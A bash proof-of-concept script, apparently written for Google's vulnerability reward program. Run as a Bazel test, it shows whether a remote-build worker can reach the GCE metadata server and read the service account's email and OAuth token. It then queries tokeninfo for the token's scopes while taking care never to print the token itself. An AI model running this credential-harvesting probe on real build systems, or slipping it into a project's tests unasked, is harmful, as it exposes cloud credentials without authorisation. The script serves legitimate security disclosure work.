#!/bin/bash
# SC-C7 security probe (Google OSS VRP): is the GCE metadata server
# reachable from inside a Bazel RBE worker action?
#
# Prints ONLY: HTTP status codes, the service-account email, and token
# scopes/expiry from the tokeninfo endpoint. NEVER prints a token value
# or any response body that could contain a secret.
# Exits 1 always, so Bazel prints this output under --test_output=errors.
set -u

BASE="http://metadata.google.internal/computeMetadata/v1"
HDR="Metadata-Flavor: Google"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# fetch URL -> body file; prints the HTTP status code (000 on transport failure).
# Tries curl, then wget, then python3. Never echoes the URL.
fetch_code() {
  local url="$1" out="$2" code=""
  if command -v curl >/dev/null 2>&1; then
    code="$(curl -s --max-time 10 -H "$HDR" -o "$out" -w "%{http_code}" "$url" 2>/dev/null)"
    [ -n "$code" ] || code="000"
  elif command -v wget >/dev/null 2>&1; then
    wget -q --server-response -O "$out" --header="$HDR" --timeout=10 "$url" 2>"$TMP/wget.err" || true
    code="$(grep -o 'HTTP/[0-9.]* [0-9]*' "$TMP/wget.err" | tail -1 | awk '{print $2}')"
    [ -n "$code" ] || code="000"
  elif command -v python3 >/dev/null 2>&1; then
    code="$(python3 - "$url" "$out" <<'PYEOF' 2>/dev/null || echo "000"
import sys, urllib.request
url, out = sys.argv[1], sys.argv[2]
req = urllib.request.Request(url, headers={"Metadata-Flavor": "Google"})
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        open(out, "wb").write(r.read())
        print(r.status)
except urllib.error.HTTPError as e:
    open(out, "wb").write(e.read())
    print(e.code)
except Exception:
    print("000")
PYEOF
)"
  else
    code="000"
  fi
  printf '%s' "$code"
}

field() { # field FILE KEY -> value of "KEY": "value" (or "KEY": number), empty if absent
  grep -o "\"$2\": *\"[^\"]*\"" "$1" 2>/dev/null | head -1 | sed 's/^"[^"]*": *"//; s/"$//' || true
  grep -o "\"$2\": *[0-9]*" "$1" 2>/dev/null | head -1 | sed 's/^"[^"]*": *//' || true
}

echo "SC7_PROBE_START"
echo "client: curl=$(command -v curl || echo none) wget=$(command -v wget || echo none) python3=$(command -v python3 || echo none)"

EMAIL_CODE="$(fetch_code "$BASE/instance/service-accounts/default/email" "$TMP/email")"
echo "email_endpoint_status: $EMAIL_CODE"
if [ "$EMAIL_CODE" = "200" ]; then
  echo "sa_email: $(cat "$TMP/email")"
fi

TOKEN_CODE="$(fetch_code "$BASE/instance/service-accounts/default/token" "$TMP/token")"
echo "token_endpoint_status: $TOKEN_CODE"
if [ "$TOKEN_CODE" = "200" ]; then
  TOKEN="$(field "$TMP/token" access_token)"
  if [ -n "$TOKEN" ]; then
    # tokeninfo response contains scope, expires_in, email - no token value.
    # The token itself is only ever in the request URL, never printed.
    TI_CODE="$(curl -s --max-time 10 -o "$TMP/tokeninfo" -w "%{http_code}" "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" 2>/dev/null)"
    [ -n "$TI_CODE" ] || TI_CODE="000"
    if [ "$TI_CODE" != "200" ]; then
      if command -v wget >/dev/null 2>&1; then
        wget -q --server-response -O "$TMP/tokeninfo" --timeout=10 "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" 2>"$TMP/wget2.err" || true
        TI_CODE="$(grep -o 'HTTP/[0-9.]* [0-9]*' "$TMP/wget2.err" | tail -1 | awk '{print $2}')"
        [ -n "$TI_CODE" ] || TI_CODE="000"
      fi
    fi
    echo "tokeninfo_status: $TI_CODE"
    if [ "$TI_CODE" = "200" ]; then
      echo "token_scopes: $(field "$TMP/tokeninfo" scope)"
      echo "token_expires_in: $(field "$TMP/tokeninfo" expires_in)"
      echo "token_email: $(field "$TMP/tokeninfo" email)"
    fi
    unset TOKEN
  else
    echo "token_parse: empty"
  fi
fi

echo "SC7_PROBE_DONE"
exit 1
